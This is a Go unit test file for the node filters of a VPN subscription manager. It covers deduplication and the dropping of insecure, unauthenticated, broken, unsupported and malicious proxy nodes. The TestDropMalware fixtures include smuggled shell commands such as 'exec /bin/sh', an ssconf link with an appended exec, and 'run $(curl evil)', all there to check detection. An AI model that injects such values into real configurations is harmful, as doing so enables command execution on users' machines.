package filter

import (
	"testing"

	"vpn-sub-manager/internal/model"
)

func TestDedup(t *testing.T) {
	a := model.Node{Protocol: model.SchemeVLESS, Host: "h1", Port: 443, User: "u1", Name: "A", Source: "s1"}
	b := model.Node{Protocol: model.SchemeVLESS, Host: "h1", Port: 443, User: "u1", Name: "B", Source: "s2"}
	c := model.Node{Protocol: model.SchemeVLESS, Host: "h1", Port: 443, User: "u1", Name: "C", Source: "s3"}
	d := model.Node{Protocol: model.SchemeVLESS, Host: "h2", Port: 443, User: "u1", Name: "D", Source: "s4"}

	got := Dedup([]model.Node{a, b, c, d})
	if len(got) != 2 {
		t.Fatalf("expected 2 after dedup, got %d", len(got))
	}
	// First occurrence kept, with its Source.
	if got[0].Name != "A" || got[0].Source != "s1" {
		t.Fatalf("first kept node wrong: %+v", got[0])
	}
	if got[1].Name != "D" {
		t.Fatalf("second kept node wrong: %+v", got[1])
	}

	// Differ only by Name -> still deduped.
	e1 := model.Node{Protocol: model.SchemeTrojan, Host: "x", Port: 1, User: "y", Name: "n1"}
	e2 := model.Node{Protocol: model.SchemeTrojan, Host: "x", Port: 1, User: "y", Name: "n2"}
	if len(Dedup([]model.Node{e1, e2})) != 1 {
		t.Fatal("nodes differing only by Name should be deduped")
	}
}

func TestDedupDifferentSecurityKeepsSecure(t *testing.T) {
	// Same Protocol|Host|Port|User but different Security must NOT collapse:
	// both survive dedup, then DropInsecure keeps only the TLS variant.
	insecure := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 443, User: "u", Security: "none"}
	secure := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 443, User: "u", Security: "tls"}

	// Insecure-first: before Security was in the key the secure twin was lost;
	// now both distinct configs survive dedup.
	deduped := Dedup([]model.Node{insecure, secure})
	if len(deduped) != 2 {
		t.Fatalf("expected 2 distinct nodes after dedup (differ by Security), got %d", len(deduped))
	}
	got := DropInsecure(deduped)
	if len(got) != 1 || got[0].Security != "tls" {
		t.Fatalf("expected only the TLS node to survive, got %+v", got)
	}
}

func TestDedupKeepsTransportVariants(t *testing.T) {
	// The same endpoint advertised over ws and grpc must survive dedup as two
	// distinct configs (different Network), not collapse into one — both
	// transports are valid and some networks only allow one of them.
	ws := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls", Network: "ws"}
	grpc := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls", Network: "grpc"}
	if len(Dedup([]model.Node{ws, grpc})) != 2 {
		t.Fatal("same endpoint over ws and grpc must not be deduped into one")
	}
	// An endpoint offered only over tcp must still dedup with itself.
	tcpA := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls", Network: "tcp"}
	tcpB := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls", Network: "tcp"}
	if len(Dedup([]model.Node{tcpA, tcpB})) != 1 {
		t.Fatal("identical tcp nodes must still dedup")
	}
}

func TestDropInsecure(t *testing.T) {
	// VLESS security=none -> dropped (plaintext).
	vlessNone := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "none"}
	// VLESS security=tls -> KEPT.
	vlessTLS := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls"}
	// VLESS security=reality -> KEPT (REALITY is TLS-grade transport).
	vlessReality := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "reality"}
	// VLESS encryption=none + security=tls -> KEPT (encryption=none is normal VLESS default).
	vlessEncNoneTLS := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls", Encryption: "none"}
	// VMess without TLS -> dropped.
	vmessNoTLS := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, User: "u", Security: ""}
	// VMess with TLS -> kept.
	vmessTLS := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, User: "u", Security: "tls"}
	// Trojan without TLS -> dropped.
	trojanNoTLS := model.Node{Protocol: model.SchemeTrojan, Host: "h", Port: 1, User: "u", Security: "none"}
	// Trojan with TLS -> kept.
	trojanTLS := model.Node{Protocol: model.SchemeTrojan, Host: "h", Port: 1, User: "u", Security: "tls"}
	// Hysteria2 with security=none -> dropped (no transport security).
	hy2 := model.Node{Protocol: model.SchemeHysteria2, Host: "h", Port: 1, User: "u", Security: "none"}
	// TUIC without security field -> KEPT (only explicit none is dropped).
	tuic := model.Node{Protocol: model.SchemeTUIC, Host: "h", Port: 1, User: "u"}
	// Plain forward proxy (socks) -> dropped.
	socks := model.Node{Protocol: model.Scheme("socks"), Host: "h", Port: 1, User: "u"}
	// Cert-skip via Extra -> dropped.
	certSkip := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"skip-cert-verify": "true"}}

	// SS/WireGuard nodes are removed upstream by DropUnsupported and never reach
	// DropInsecure; they are covered by TestDropUnsupported instead.
	got := DropInsecure([]model.Node{
		vlessNone, vlessTLS, vlessReality, vlessEncNoneTLS, vmessNoTLS, vmessTLS,
		trojanNoTLS, trojanTLS, hy2, tuic, socks, certSkip,
	})

	// Assert exact survivors by checking each expected outcome.
	wantKept := []model.Node{vlessTLS, vlessReality, vlessEncNoneTLS, vmessTLS, trojanTLS, tuic}
	wantDropped := []model.Node{vlessNone, vmessNoTLS, trojanNoTLS, hy2, socks, certSkip}

	for _, n := range wantKept {
		if !containsNode(got, n) {
			t.Errorf("expected node kept: %+v", n)
		}
	}
	for _, n := range wantDropped {
		if containsNode(got, n) {
			t.Errorf("expected node dropped: %+v", n)
		}
	}
	if len(got) != len(wantKept) {
		t.Fatalf("expected %d survivors, got %d: %+v", len(wantKept), len(got), got)
	}
}

func TestDropOpen(t *testing.T) {
	// VMess with TLS but empty User (no auth) -> DROPPED.
	vmessOpen := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, Security: "tls"}
	// VMess with TLS and non-empty User -> KEPT.
	vmessAuth := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, User: "u", Security: "tls"}
	// SS with method but empty User (no password) -> DROPPED.
	ssOpen := model.Node{Protocol: model.SchemeSS, Host: "h", Port: 1, Encryption: "aes-256-gcm"}
	// SS with method and non-empty User (password) -> KEPT.
	ssAuth := model.Node{Protocol: model.SchemeSS, Host: "h", Port: 1, User: "pw", Encryption: "aes-256-gcm"}
	// Hysteria2 with empty User -> KEPT (not enforced; secret may live in Extra).
	hy2Open := model.Node{Protocol: model.SchemeHysteria2, Host: "h", Port: 1}

	got := DropOpen([]model.Node{vmessOpen, vmessAuth, ssOpen, ssAuth, hy2Open})

	wantKept := []model.Node{vmessAuth, ssAuth, hy2Open}
	wantDropped := []model.Node{vmessOpen, ssOpen}

	for _, n := range wantKept {
		if !containsNode(got, n) {
			t.Errorf("expected node kept: %+v", n)
		}
	}
	for _, n := range wantDropped {
		if containsNode(got, n) {
			t.Errorf("expected node dropped: %+v", n)
		}
	}
	if len(got) != len(wantKept) {
		t.Fatalf("expected %d survivors, got %d: %+v", len(wantKept), len(got), got)
	}
}

func TestDropBroken(t *testing.T) {
	// Complete node -> KEPT.
	good := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls"}
	// Empty Host -> dropped.
	noHost := model.Node{Protocol: model.SchemeVLESS, Host: "", Port: 443, User: "u", Security: "tls"}
	// Port 0 -> dropped.
	noPort := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 0, User: "u", Security: "tls"}
	// Empty User (no credential) -> dropped.
	noUser := model.Node{Protocol: model.SchemeHysteria2, Host: "h", Port: 1, User: ""}

	got := DropBroken([]model.Node{good, noHost, noPort, noUser})

	wantKept := []model.Node{good}
	wantDropped := []model.Node{noHost, noPort, noUser}

	for _, n := range wantKept {
		if !containsNode(got, n) {
			t.Errorf("expected node kept: %+v", n)
		}
	}
	for _, n := range wantDropped {
		if containsNode(got, n) {
			t.Errorf("expected node dropped: %+v", n)
		}
	}
	if len(got) != len(wantKept) {
		t.Fatalf("expected %d survivors, got %d: %+v", len(wantKept), len(got), got)
	}
}

func TestDropUnsupported(t *testing.T) {
	// Shadowsocks -> dropped (DPI-fingerprintable; obfs lives on SS).
	ss := model.Node{Protocol: model.SchemeSS, Host: "h", Port: 1, User: "u", Encryption: "aes-256-gcm"}
	// WireGuard -> dropped (handshake trivially recognizable).
	wg := model.Node{Protocol: model.SchemeWireGuard, Host: "h", Port: 1, User: "u"}
	// Kept schemes survive.
	vless := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls"}
	vmess := model.Node{Protocol: model.SchemeVMess, Host: "h", Port: 1, User: "u", Security: "tls"}
	trojan := model.Node{Protocol: model.SchemeTrojan, Host: "h", Port: 1, User: "u", Security: "tls"}
	hy2 := model.Node{Protocol: model.SchemeHysteria2, Host: "h", Port: 1, User: "u"}
	tuic := model.Node{Protocol: model.SchemeTUIC, Host: "h", Port: 1, User: "u"}

	got := DropUnsupported([]model.Node{ss, wg, vless, vmess, trojan, hy2, tuic})

	if containsNode(got, ss) || containsNode(got, wg) {
		t.Error("SS and WireGuard must be dropped by DropUnsupported")
	}
	for _, n := range []model.Node{vless, vmess, trojan, hy2, tuic} {
		if !containsNode(got, n) {
			t.Errorf("expected kept: %+v", n)
		}
	}
	if len(got) != 5 {
		t.Fatalf("expected 5 survivors, got %d: %+v", len(got), got)
	}
}

func TestDropMalware(t *testing.T) {
	// exec in Extra -> dropped.
	execNode := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"exec": "/bin/sh -c evil"}}
	// outbound-hijack -> dropped.
	hijack := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"outbound-hijack": "1"}}
	// benign unknown Extra field -> KEPT.
	benign := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"dialer-proxy": "proxy-a"}}
	// plain ssconf:// config link -> KEPT.
	ssconfLink := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"ssconf": "ssconf://example.com/config"}}
	// ssconf with exec payload -> dropped.
	ssconfExec := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"ssconf": "ssconf://example.com/x.sh; exec /bin/sh"}}
	// benign Plugin (obfs) -> KEPT (Plugin not in scope).
	pluginNode := model.Node{Protocol: model.SchemeSS, Host: "h", Port: 1, User: "u", Encryption: "aes-256-gcm",
		Plugin: "obfs-local;obfs=http"}
	// VLESS ws path with query separators (&) -> KEPT (benign param, not a payload).
	vlessPath := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"path": "/?ed=2048&v=1"}}
	// Hysteria2 obfs-password -> KEPT (benign param).
	hy2Obfs := model.Node{Protocol: model.SchemeHysteria2, Host: "h", Port: 1, User: "u",
		Extra: map[string]string{"obfs-password": "s3cr3t-p@ss"}}
	// Non-dangerous key carrying a real exec payload -> dropped (value path).
	execValue := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"note": "exec /bin/sh -c evil"}}
	// Non-dangerous key with command substitution -> dropped (value path).
	substValue := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"note": "run $(curl evil)"}}
	// Non-dangerous key with a script extension payload -> dropped (value path).
	scriptValue := model.Node{Protocol: model.SchemeVLESS, Host: "h", Port: 1, User: "u", Security: "tls",
		Extra: map[string]string{"payload": "x.sh"}}

	got := DropMalware([]model.Node{execNode, hijack, benign, ssconfLink, ssconfExec, pluginNode,
		vlessPath, hy2Obfs, execValue, substValue, scriptValue})

	wantKept := []model.Node{benign, ssconfLink, pluginNode, vlessPath, hy2Obfs}
	wantDropped := []model.Node{execNode, hijack, ssconfExec, execValue, substValue, scriptValue}

	for _, n := range wantKept {
		if !containsNode(got, n) {
			t.Errorf("expected node kept: %+v", n)
		}
	}
	for _, n := range wantDropped {
		if containsNode(got, n) {
			t.Errorf("expected node dropped: %+v", n)
		}
	}
	if len(got) != len(wantKept) {
		t.Fatalf("expected %d survivors, got %d: %+v", len(wantKept), len(got), got)
	}
}

func TestApply(t *testing.T) {
	// Dedup + insecure + malware combined.
	nodes := []model.Node{
		{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "none"},      // insecure -> drop
		{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "none"},      // dup + insecure
		{Protocol: model.SchemeVLESS, Host: "h", Port: 443, User: "u", Security: "tls", Extra: map[string]string{"exec": "x"}}, // malware -> drop
		{Protocol: model.SchemeHysteria2, Host: "h2", Port: 443, User: "u"},                    // kept
	}
	got := Apply(nodes)
	if len(got) != 1 || got[0].Protocol != model.SchemeHysteria2 {
		t.Fatalf("Apply expected 1 hysteria2 survivor, got %+v", got)
	}
}

// containsNode matches by the meaningful fields (everything except Raw/Source/
// Name) so tests are robust to map ordering and Source differences.
func containsNode(nodes []model.Node, n model.Node) bool {
	for _, m := range nodes {
		if m.Protocol == n.Protocol && m.Host == n.Host && m.Port == n.Port &&
			m.User == n.User && m.Security == n.Security && m.Encryption == n.Encryption &&
			m.Plugin == n.Plugin && extraEqual(m.Extra, n.Extra) {
			return true
		}
	}
	return false
}

func extraEqual(a, b map[string]string) bool {
	if len(a) != len(b) {
		return false
	}
	for k, v := range a {
		if b[k] != v {
			return false
		}
	}
	return true
}
